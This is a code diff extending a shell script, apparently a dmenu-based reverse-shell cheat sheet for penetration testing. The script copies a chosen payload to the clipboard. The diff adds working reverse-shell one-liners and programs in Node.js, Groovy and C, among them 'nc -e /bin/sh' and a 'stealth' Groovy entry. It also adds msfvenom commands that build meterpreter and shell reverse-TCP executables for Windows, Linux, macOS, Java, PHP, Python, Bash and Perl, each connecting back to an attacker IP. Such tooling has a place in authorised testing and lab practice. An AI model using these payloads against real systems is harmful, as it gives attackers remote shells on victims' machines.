@@ -82,6 +82,54 @@ war1_shell="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f
 ## lua
 lua1lin_shell="lua -e "\""require('socket');require('os');t=socket.tcp();t:connect('$tun0_ip','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');"\"""
 lua2x_shell="lua5.1 -e 'local host, port = "$tun0_ip", $port local socket = require("\""socket"\"") local tcp = socket.tcp() local io = require("\""io"\"") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "\""r"\"") local s = f:read("\""*a"\"") f:close() tcp:send(s) if status == "\""closed"\"" then break end end tcp:close()'"
+## nodejs
+nodejs1_shell="(function(){\nvar net = require("\""net"\""),\ncp = require("\""child_process"\""),\nsh = cp.spawn("\""/bin/sh"\"", []);\nvar client = new net.Socket();\nclient.connect($port, "\""$tun0_ip"\"", function(){\nclient.pipe(sh.stdin);\nsh.stdout.pipe(client);\nsh.stderr.pipe(client);\n});\nreturn /a/;\n})();"
+nodejs2_shell="require('child_process').exec('nc -e /bin/sh $tun0_ip $port')"
+## groovy
+groovywin1_shell="String host="\""$tun0_ip"\"";\nint port=$port;\nString cmd="\""cmd.exe"\"";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+groovystealth1_shell="Thread.start {\n//Revshell here\n}"
+# c
+c_shell="#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    int port = $port;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("\""$tun0_ip"\"");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"\""/bin/sh"\"", NULL};
+    execve("\""/bin/sh"\"", argv, NULL);
+
+    return 0;
+}
+"
+## msfvenom (meterpreter)
+msfwin1_shell="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$tun0_ip LPORT=$port -f exe > reverse.exe"
+msfwin2_shell="msfvenom -p windows/shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f exe > reverse.exe"
+msfwin3_shell="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$tun0_ip LPORT=$port -f asp > shell.asp"
+msflin1_shell="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$tun0_ip LPORT=$port -f elf >reverse.elf"
+msflin2_shell="msfvenom -p linux/x86/shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f elf >reverse.elf"
+msfosx1_shell="msfvenom -p osx/x86/shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f macho > shell.macho"
+msfjava1_shell="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f raw > shell.jsp"
+msfpython1_shell="msfvenom -p cmd/unix/reverse_python LHOST=$tun0_ip LPORT=$port -f raw > shell.py"
+msfbash1_shell="msfvenom -p cmd/unix/reverse_bash LHOST=$tun0_ip LPORT=$port -f raw > shell.sh"
+msfperl1_shell="msfvenom -p cmd/unix/reverse_perl LHOST=$tun0_ip LPORT=$port -f raw > shell.pl"
+msfphp1_shell="msfvenom -p php/meterpreter_reverse_tcp LHOST=$tun0_ip LPORT=$port -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php"
 
 # ---
 
@@ -139,12 +187,32 @@ war1_text="war1 (msfvenom) -> $war1_shell"
 ## lua
 lua1lin_text="lua1l (linux only) -> $lua1lin_shell"
 lua2x_text="lua2x (both platforms (win & lin)) -> $lua2x_shell"
+## nodejs
+nodejs1_text="ndjs1 (multi line)"
+nodejs2_text="ndjs2 (child_process + nc) -> $nodejs2_shell"
+## groovy
+groovywin1_text="groovyw1 (multi line)"
+groovystealth1_text="groovys1 (stealth)"
+## c
+c_text="clang (multi line + u have to compile)"
+## msf
+msfwin1_text="msfw1 (meterpreter) -> $msfwin1_shell"
+msfwin2_text="msfw2 (shell) -> $msfwin2_shell"
+msfwin3_text="msfw3 (asp) -> $msfwin3_shell"
+msflin1_text="msfl1 (meterpreter) -> $msflin1_shell"
+msflin2_text="msfl2 (shell) -> $msflin2_shell"
+msfosx1_text="msfosx (shell + macho format) -> $msfosx1_shell"
+msfjava1_text="msfjava1 (jsp) -> $msfjava1_shell"
+msfpython1_text="msfpy1 (unix python) -> $msfpython1_shell"
+msfbash1_text="msfbash1 (unix bash) -> $msfbash1_shell"
+msfperl1_text="msfpl1 (unix perl) -> $msfperl1_shell"
+msfphp1_text="msfph1 (php) -> $msfphp1_shell"
 
 
 # ---
 
 # The Juicy part
-case "$(printf "$bashtcp1_text\\n$bashtcp2_text\\n$bashudp1_text\\n$socat1_text\\n$perllin1_text\\n$perllin2_text\\n$perlwin1_text\\n$pythonipv4lin1_text\\n$pythonipv4lin2_text\\n$pythonipv4lin3_text\\n$pythonipv6lin1_text\\n$pythonipv4win1_text\\n$phplin1_text\\n$phplin2_text\\n$phplin3_text\\n$phplin4_text\\n$phplin5_text\\n$phplin6_text\\n$phplin7_text\\n$rubylin1_text\\n$rubylin2_text\\n$rubywin1_text\\n$golanglin1_text\\n$nc1_text\\n$nc2_text\\n$nc3_text\\n$ncat1_text\\n$ncatudp1_text\\n$openssl1_text\\n$powershell1_text\\n$powershell2_text\\n$powershell3_text\\n$awk1_text\\n$javalin1_text\\n$javawin1_text\\n$javastealth1_text\\n$war1_text\\n$lua1lin_text\\n$lua2x_text" | dmenu -l 15 -i -p "R3vSh3LLZ")" in
+case "$(printf "$bashtcp1_text\\n$bashtcp2_text\\n$bashudp1_text\\n$socat1_text\\n$perllin1_text\\n$perllin2_text\\n$perlwin1_text\\n$pythonipv4lin1_text\\n$pythonipv4lin2_text\\n$pythonipv4lin3_text\\n$pythonipv6lin1_text\\n$pythonipv4win1_text\\n$phplin1_text\\n$phplin2_text\\n$phplin3_text\\n$phplin4_text\\n$phplin5_text\\n$phplin6_text\\n$phplin7_text\\n$rubylin1_text\\n$rubylin2_text\\n$rubywin1_text\\n$golanglin1_text\\n$nc1_text\\n$nc2_text\\n$nc3_text\\n$ncat1_text\\n$ncatudp1_text\\n$openssl1_text\\n$powershell1_text\\n$powershell2_text\\n$powershell3_text\\n$awk1_text\\n$javalin1_text\\n$javawin1_text\\n$javastealth1_text\\n$war1_text\\n$lua1lin_text\\n$lua2x_text\\n$nodejs1_text\\n$nodejs2_text\\n$groovywin1_text\\n$groovystealth1_text\\n$c_text\\n$msfwin1_text\\n$msfwin2_text\\n$msfwin3_text\\n$msflin1_text\\n$msflin2_text\\n$msfosx1_text\\n$msfjava1_text\\n$msfpython1_text\\n$msfbash1_text\\n$msfperl1_text\\n$msfphp1_text" | dmenu -l 15 -i -p "R3vSh3LLZ")" in
 
     ## bash
     "$bashtcp1_text") echo -n "$bashtcp1_shell" | xclip -selection clipboard ;;
@@ -213,4 +281,32 @@ case "$(printf "$bashtcp1_text\\n$bashtcp2_text\\n$bashudp1_text\\n$socat1_text\
     "$lua1lin_text") echo -n "$lua1lin_shell" | xclip -selection clipboard ;;
     "$lua2x_text") echo -n "$lua2x_shell" | xclip -selection clipboard ;;
 
+    ## nodejs
+    "$nodejs1_text") echo -n "$nodejs1_shell" | xclip -selection clipboard ;;
+    "$nodejs2_text") echo -n "$nodejs2_shell" | xclip -selection clipboard ;;
+
+    ## groovy
+    "$groovywin1_text") echo -n "$groovywin1_shell" | xclip -selection clipboard ;;
+    "$groovystealth1_text") echo -n "$groovystealth1_shell" | xclip -selection clipboard ;;
+
+    ## c
+    "$c_text") echo -n "$c_shell" | xclip -selection clipboard ;;
+
+    ## msfvenom (meterpreter)
+
+    "$msfwin1_text") echo -n "$msfwin1_shell" | xclip -selection clipboard ;;
+    "$msfwin2_text") echo -n "$msfwin2_shell" | xclip -selection clipboard ;;
+    "$msfwin3_text") echo -n "$msfwin3_shell" | xclip -selection clipboard ;;
+    ### linux
+    "$msflin1_text") echo -n "$msflin1_shell" | xclip -selection clipboard ;;
+    "$msflin2_text") echo -n "$msflin2_shell" | xclip -selection clipboard ;;
+    ### osx
+    "$msfosx1_text") echo -n "$msfosx1_shell" | xclip -selection clipboard ;;
+    ### java
+    "$msfjava1_text") echo -n "$msfjava1_shell" | xclip -selection clipboard ;;
+    ### py, pl, bash, php with msfvenom
+    "$msfpython1_text") echo -n "$msfpython1_shell" | xclip -selection clipboard ;;
+    "$msfbash1_text") echo -n "$msfbash1_shell" | xclip -selection clipboard ;;
+    "$msfperl1_text") echo -n "$msfperl1_shell" | xclip -selection clipboard ;;
+    "$msfphp1_text") echo -n "$msfphp1_shell" | xclip -selection clipboard ;;
 esac
